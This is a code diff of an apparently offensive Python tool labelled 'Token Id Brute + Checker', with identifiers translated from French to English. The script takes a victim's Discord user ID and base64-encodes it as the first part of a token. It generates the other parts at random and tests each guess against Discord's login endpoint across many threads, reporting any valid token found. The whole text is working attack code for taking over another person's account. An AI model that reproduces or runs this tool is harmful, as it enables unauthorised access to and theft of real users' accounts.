@@ -9,31 +9,31 @@ import colorama
 from colorama import Fore
 colorama.init()
 
-TitrePage("Token Id Brute + Checker")
+Title("Token Id Brute + Checker")
 
-idtoken = base64.b64encode((input(f"{couleur.RED}[?] | Victime ID -> {couleur.RESET}")).encode("ascii"))
+idtoken = base64.b64encode((input(f"{color.RED}[?] | Victime ID -> {color.RESET}")).encode("ascii"))
 idtoken = str(idtoken)[2:-1]
 try:
- thrd =  input(f"{couleur.RED}\n[?] | Threads -> {couleur.RESET}")
+ thrd =  input(f"{color.RED}\n[?] | Threads -> {color.RESET}")
 except:
- ErreurNombre()
+ ErrorNumber()
 
 def bruhmoment():
     while idtoken == idtoken:
         try:
          token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
         except:
-         ErreurId()
+         ErrorId()
         header={
             'Authorization': token
         }
         bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)
 
         if bruh.status_code == 200:
-                print(f"{couleur.GREEN}[X] | {couleur.CYAN}{token}{couleur.GREEN} | Token Found{couleur.RESET}")
+                print(f"{color.GREEN}[X] | {color.CYAN}{token}{color.GREEN} | Token Found{color.RESET}")
 
         else:
-                print(f"{couleur.RED}[X] | {couleur.CYAN}{token}{couleur.RED} | Token Invalid{couleur.RESET}")
+                print(f"{color.RED}[X] | {color.CYAN}{token}{color.RED} | Token Invalid{color.RESET}")
 
 threads = []
 try:
@@ -42,7 +42,7 @@ try:
     t.start()
     threads.append(t)
 except:
- ErreurNombre()
+ ErrorNumber()
 
 for thread in threads:
     thread.join()
